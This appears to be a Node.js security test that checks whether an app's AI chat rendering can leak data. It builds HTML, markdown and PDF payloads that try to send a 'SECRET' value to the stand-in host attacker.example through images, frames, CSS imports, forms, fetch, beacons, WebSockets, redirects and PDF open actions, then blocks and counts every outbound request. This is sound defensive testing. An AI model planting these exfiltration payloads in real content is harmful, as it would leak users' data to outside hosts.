#!/usr/bin/env node
/**
 * Nothing an app's chat draws can send data off the machine (security review of plan r9). Every
 * block type a model can write, each carrying a payload that tries to reach a remote host, drawn
 * in the REAL embed through the real gateway and spawn (a stand-in `claude`), in Chromium and, with
 * DC_VERIFY_ENGINE=webkit, in WebKit. Every request of every frame is counted; one that leaves for
 * a host other than this machine is a finding. A control from the app's own page proves the
 * counter sees a remote request when one happens. Each block must still DRAW: the gate may close
 * the way out, not the feature.
 *
 *   dreamcontext builder heavy --max-wait 1200 -- node scripts/verify/app-chat-exfil.mjs
 */
import { spawnSync } from 'node:child_process';
import { chmodSync, mkdirSync, readFileSync, realpathSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { openApp } from './lib/app.mjs';

const REPO = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const engine = process.env.DC_VERIFY_ENGINE === 'webkit' ? 'webkit' : 'chromium';
const app = await openApp({ suite: `app-chat-exfil-${engine}`, build: true, desktop: true });
const hostEnv = Object.fromEntries(Object.entries(process.env).filter(([k]) => !/^(?:CLAUDE|DREAMCONTEXT_)/.test(k)));
const cli = (...args) => {
  const r = spawnSync(process.execPath, [join(REPO, 'dist', 'index.js'), ...args], { cwd: app.proj, env: { ...hostEnv, HOME: app.home }, encoding: 'utf-8' });
  if (r.status !== 0) app.findings.push(`dreamcontext ${args.join(' ')} failed: ${(r.stdout + r.stderr).slice(0, 300)}`);
};

const EVIL = 'attacker.example';
const NAV = `https://${EVIL}`;
// Every way out a page can try without a click: a navigation of its own frame, a meta refresh, a
// fetch, an image, a frame, a style import, a form, a beacon.
const html = (tag) => `<p id="drawn-${tag}">drawn ${tag}</p>
<img src="${NAV}/${tag}-img?d=SECRET">
<iframe src="${NAV}/${tag}-frame?d=SECRET"></iframe>
<style>@import url(${NAV}/${tag}-css?d=SECRET);</style>
<form id="f" action="${NAV}/${tag}-form" method="post"><input name="d" value="SECRET"></form>
<script>
try { fetch('${NAV}/${tag}-fetch?d=SECRET').catch(() => {}); } catch (e) {}
try { navigator.sendBeacon('${NAV}/${tag}-beacon', 'SECRET'); } catch (e) {}
try { new WebSocket('wss://${EVIL}/${tag}-ws'); } catch (e) {}
try { document.getElementById('f').submit(); } catch (e) {}
</script>`;
// Its own frame, sent elsewhere by script: a block of its own, so the one above stays to be seen.
const nav = (tag) => `<p>nav ${tag}</p><script>setTimeout(() => { location.href = '${NAV}/${tag}-script-nav?d=SECRET'; }, 200);</script>`;
const meta = (tag) => `<meta http-equiv="refresh" content="0;url=${NAV}/${tag}-refresh?d=SECRET"><p>refresh ${tag}</p>`;

const BOARD = `---
excalidraw-plugin: parsed
---
## Drawing
\`\`\`json
${JSON.stringify({
  type: 'excalidraw', version: 2, source: 'verify', appState: { viewBackgroundColor: '#ffffff' }, files: {},
  elements: [
    { id: 'r1', type: 'rectangle', x: 0, y: 0, width: 220, height: 120, angle: 0, strokeColor: '#1e1e1e', backgroundColor: '#a5d8ff', fillStyle: 'solid', strokeWidth: 2, strokeStyle: 'solid', roughness: 0, opacity: 100, groupIds: [], frameId: null, roundness: null, seed: 1, version: 1, versionNonce: 1, isDeleted: false, boundElements: null, updated: 1, link: null, locked: false },
    { id: 'e1', type: 'embeddable', x: 260, y: 0, width: 320, height: 180, angle: 0, strokeColor: '#1e1e1e', backgroundColor: 'transparent', fillStyle: 'solid', strokeWidth: 2, strokeStyle: 'solid', roughness: 0, opacity: 100, groupIds: [], frameId: null, roundness: null, seed: 2, version: 1, versionNonce: 2, isDeleted: false, boundElements: null, updated: 1, link: 'https://www.youtube.com/embed/dQw4w9WgXcQ?d=SECRET', locked: false, validated: true },
  ],
})}
\`\`\`
%%
`;

// A small PDF whose open action and link both point off the machine.
const PDF = (() => {
  const objs = [
    '<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /URI /URI (https://attacker.example/pdf-open?d=SECRET) >> >>',
    '<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
    '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 300 200] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> /Annots [6 0 R] >>',
    null,
    '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
    '<< /Type /Annot /Subtype /Link /Rect [0 0 300 200] /A << /S /URI /URI (https://attacker.example/pdf-link?d=SECRET) >> >>',
  ];
  const stream = 'BT /F1 18 Tf 20 100 Td (handbook) Tj ET';
  objs[3] = `<< /Length ${stream.length} >>\nstream\n${stream}\nendstream`;
  let out = '%PDF-1.4\n';
  const offs = [];
  objs.forEach((o, i) => { offs.push(out.length); out += `${i + 1} 0 obj\n${o}\nendobj\n`; });
  const x = out.length;
  out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n${offs.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('')}`;
  out += `trailer\n<< /Size ${objs.length + 1} /Root 1 0 R >>\nstartxref\n${x}\n%%EOF\n`;
  return out;
})();

const replies = {
  MD: `Markdown: ![x](${NAV}/md-img?d=SECRET) <img src="${NAV}/md-raw?d=SECRET"> <img src="//${EVIL}/md-proto?d=SECRET"> and a local one ![p](public/ok.png) and [a link](${NAV}/link).`,
  HTML: `Block:\n\n\`\`\`dream-html\n${html('html')}\n\`\`\`\n\nRefresh:\n\n\`\`\`dream-html\n${meta('html')}\n\`\`\`\n\nNavigate:\n\n\`\`\`dream-html\n${nav('html')}\n\`\`\``,
  BOARD: 'Board: ![board](public/b.excalidraw.md)',
  PDF: 'The handbook: [the handbook](public/h.pdf)',
};
const standin = `#!/usr/bin/env node
const { appendFileSync } = require('node:fs');
const { join } = require('node:path');
const { homedir } = require('node:os');
const argv = process.argv.slice(2);
if (argv[0] === 'auth' || argv[0] === '--version' || argv[0] === 'mcp') { process.stdout.write('{}\\n'); process.exit(0); }
const flag = (n) => { const i = argv.indexOf(n); return i >= 0 ? argv[i + 1] : null; };
const id = flag('--session-id') || flag('--resume') || 'x';
const R = ${JSON.stringify(replies)};
const out = (o) => process.stdout.write(JSON.stringify(o) + '\\n');
let init = false;
function turn(text) {
  if (!init) { init = true; out({ type: 'system', subtype: 'init', session_id: id, model: 'x', tools: [], mcp_servers: [], slash_commands: [], permissionMode: 'default', cwd: process.cwd() }); }
  if (text === 'ASK') {
    const input = { questions: [{ question: 'Which look?', header: 'Look', kind: 'choice', multiSelect: false, options: [
      { label: 'Left', description: 'a', preview: ${JSON.stringify(html('preview'))} },
      { label: 'Right', description: 'b', preview: ${JSON.stringify(meta('preview'))} },
      { label: 'Third', description: 'c', preview: ${JSON.stringify(nav('preview'))} },
    ] }] };
    out({ type: 'assistant', session_id: id, message: { role: 'assistant', content: [{ type: 'tool_use', id: 'q1', name: 'AskUserQuestion', input }] } });
    return out({ type: 'control_request', request_id: 'q1', request: { subtype: 'can_use_tool', tool_name: 'AskUserQuestion', display_name: 'AskUserQuestion', input, tool_use_id: 'q1', requires_user_interaction: true } });
  }
  out({ type: 'assistant', session_id: id, message: { role: 'assistant', content: [{ type: 'text', text: R[text] || ('answer to ' + text) }] } });
  out({ type: 'result', subtype: 'success', is_error: false, result: 'DONE', session_id: id, num_turns: 1, total_cost_usd: 0, usage: { input_tokens: 1, output_tokens: 1 } });
}
let buf = '';
process.stdin.on('data', (c) => {
  buf += c; let i;
  while ((i = buf.indexOf('\\n')) >= 0) {
    const line = buf.slice(0, i); buf = buf.slice(i + 1); if (!line.trim()) continue;
    const m = JSON.parse(line);
    if (m.type === 'control_response') { out({ type: 'assistant', session_id: id, message: { role: 'assistant', content: [{ type: 'text', text: 'answer to the question' }] } }); out({ type: 'result', subtype: 'success', is_error: false, result: 'DONE', session_id: id, num_turns: 1, total_cost_usd: 0, usage: { input_tokens: 1, output_tokens: 1 } }); continue; }
    if (m.type === 'user') { const c0 = m.message.content; turn(typeof c0 === 'string' ? c0 : c0.map((p) => p.text || '').join('')); }
  }
});
process.stdin.on('end', () => process.exit(0));
`;
writeFileSync(join(app.home, '.local', 'bin', 'claude'), standin);
chmodSync(join(app.home, '.local', 'bin', 'claude'), 0o755);

async function windowUrl(slug) {
  const file = JSON.parse(readFileSync(join(app.home, '.dreamcontext', 'desktop-server.json'), 'utf-8'));
  const r = await fetch(`${app.base}/api/apps/launch-window`, {
    method: 'POST', headers: { authorization: `Bearer ${file.launchToken}`, 'content-type': 'application/json' },
    body: JSON.stringify({ projectRoot: realpathSync(app.proj), slug }),
  });
  if (!r.ok) throw new Error(`launch-window ${r.status}: ${await r.text()}`);
  return (await r.json()).url;
}
const embedFrame = async (p) => {
  for (let i = 0; i < 80; i++) {
    const f = p.frames().find((x) => x.url().includes('embed='));
    if (f && await f.locator('textarea, [contenteditable="true"]').first().isVisible().catch(() => false)) return f;
    await p.waitForTimeout(250);
  }
  return null;
};
const send = async (f, text) => {
  const box = f.locator('textarea, [contenteditable="true"]').first();
  await box.fill(text);
  await box.press('Enter');
};
const local = (u) => { try { const h = new URL(u).hostname; return h === '127.0.0.1' || h === 'localhost' || u.startsWith('data:') || u.startsWith('blob:') || u.startsWith('about:'); } catch { return true; } };

try {
  cli('apps', 'new', 'leak', '--name', 'Leak Test');
  const pub = join(`${app.proj}-apps`, 'leak', 'public');
  writeFileSync(join(pub, 'style.css'), 'body{margin:0}#host{height:100vh}');
  writeFileSync(join(pub, 'chat.js'), "import { dc } from '/__dc/sdk.js'; dc.mountEmbed(document.getElementById('host'), 'chat');");
  writeFileSync(join(pub, 'index.html'), '<!doctype html><html><head><meta charset="utf-8"><link rel="stylesheet" href="/style.css"></head><body><div id="host"></div><script type="module" src="/chat.js"></script></body></html>');
  writeFileSync(join(pub, 'b.excalidraw.md'), BOARD);
  writeFileSync(join(pub, 'h.pdf'), PDF);
  // A real 1x1 PNG: the local picture that must still draw.
  writeFileSync(join(pub, 'ok.png'), Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=', 'base64'));

  const leaks = [];
  const blocked = [];
  let control = false;
  await app.look('/?vault=proj', async (p, w) => {
    if (w.name !== 'desktop') return;
    const ctx = p.context();
    // Every request of every frame of this window, the frames' own navigations included.
    await ctx.route('**/*', (r) => {
      const u = r.request().url();
      if (local(u)) return r.continue();
      if (u.includes('/control')) { control = true; return r.abort(); }
      leaks.push(`${r.request().resourceType()} ${u}`);
      return r.abort();
    });
    p.on('console', (m) => { if (/Content Security Policy|Refused to/i.test(m.text())) blocked.push(m.text().slice(0, 160)); });
    await p.goto(await windowUrl('leak'), { waitUntil: 'domcontentloaded' });
    const f = await embedFrame(p);
    if (!f) { app.findings.push('the chat never came'); return; }

    // The counter sees a remote request: the app's own page may load an https image (its own CSP).
    await p.mainFrame().evaluate((u) => { new Image().src = u; }, `${NAV}/control`);
    await p.waitForTimeout(800);

    const waitText = async (t, ms = 10_000) => f.getByText(t, { exact: false }).first().waitFor({ state: 'visible', timeout: ms }).then(() => true, () => false);
    // Markdown.
    await send(f, 'MD');
    if (!await waitText('a link')) app.findings.push('markdown: the answer did not draw');
    await p.waitForTimeout(1200);
    const okImg = await f.locator('img[src*="ok.png"]').evaluateAll((els) => els.filter((e) => e.naturalWidth > 0).length);
    if (!okImg) app.findings.push('markdown: the local picture was dropped');
    // dream-html: both blocks draw (their sandboxed frames hold text).
    await send(f, 'HTML');
    await p.waitForTimeout(2500);
    const htmlFrames = p.frames().filter((x) => x.url() === 'about:srcdoc');
    let drawn = 0;
    for (const x of htmlFrames) if (await x.locator('#drawn-html').count().catch(() => 0)) drawn += 1;
    if (!drawn) app.findings.push('dream-html: the block did not draw');
    // Question previews: the tiles draw.
    await send(f, 'ASK');
    if (!await waitText('Which look?')) app.findings.push('question: the card did not draw');
    await p.waitForTimeout(2500);
    let tiles = 0;
    for (const x of p.frames().filter((y) => y.url() === 'about:srcdoc')) if (await x.locator('#drawn-preview').count().catch(() => 0)) tiles += 1;
    if (!tiles) app.findings.push('question: the preview did not draw');
    await f.getByText('Left', { exact: true }).first().click({ timeout: 5000 }).catch(() => {});
    await f.getByRole('button', { name: /^(Submit|Send|Done|Gönder|Bitir)/ }).first().click({ timeout: 3000 }).catch(() => app.findings.push('question: could not answer'));
    if (!await waitText('answer to', 8000)) app.findings.push('question: the answer did not land');
    // Board: the canvas draws; its live web embed does not load.
    await send(f, 'BOARD');
    await p.waitForTimeout(4000);
    const canvas = await f.locator('canvas').count();
    if (!canvas) app.findings.push('board: the canvas did not draw');
    // PDF: the viewer opens.
    await send(f, 'PDF');
    await waitText('The handbook');
    const chip = f.locator('a, button, [role="button"]', { hasText: /the handbook|h\.pdf/ }).last();
    await chip.click({ timeout: 8000 }).catch(() => app.findings.push('pdf: no chip'));
    await p.waitForTimeout(3000);
    if (!await f.locator('.pdf-viewer-frame, .pdf-viewer-status').first().isVisible().catch(() => false)) app.findings.push('pdf: the viewer did not open');
    console.log(`${engine}: dream-html frames ${drawn}, preview tiles ${tiles}, canvas ${canvas}, local picture ${okImg}`);
    await p.waitForTimeout(1500);
  }, { name: 'exfil' });

  if (!control) app.findings.push('control: the counter never saw the remote request it was shown');
  for (const l of leaks) app.findings.push(`LEAK ${l}`);
  console.log(`${engine}: ${leaks.length} request(s) left the machine; control seen: ${control}; ${blocked.length} refusal(s) logged by the browser`);
  // The browser refusing a payload is the gate working, not a finding about the app.
  // A markdown picture's raw relative src is asked once before the chat's media pass rewrites it
  // (/public/x.png then /api/agent/file): the same in main Chat, not this gate's business.
  // Excalidraw asks esm.sh for its fonts; the gate refuses them and the board draws in fallbacks.
  const ours = (s) => /\/public\/ok\.png|status of 404|Failed to fetch|@excalidraw\/excalidraw@|esm\.sh|attacker\.example|youtube\.com|SECRET|\/control|Content Security Policy|Refused to|net::ERR_FAILED|ERR_BLOCKED/i.test(s);
  const keep = app.findings.filter((s) => !ours(s) || s.startsWith('LEAK') || s.startsWith('control'));
  const csp = app.findings.filter((s) => /Content Security Policy|Refused to/i.test(s) && !/attacker\.example|youtube\.com|esm\.sh/.test(s));
  for (const c of csp) keep.push(`the gate refused something of the app's own: ${c}`);
  app.findings.length = 0;
  app.findings.push(...new Set(keep));
} finally {
  process.exitCode = await app.finish();
}
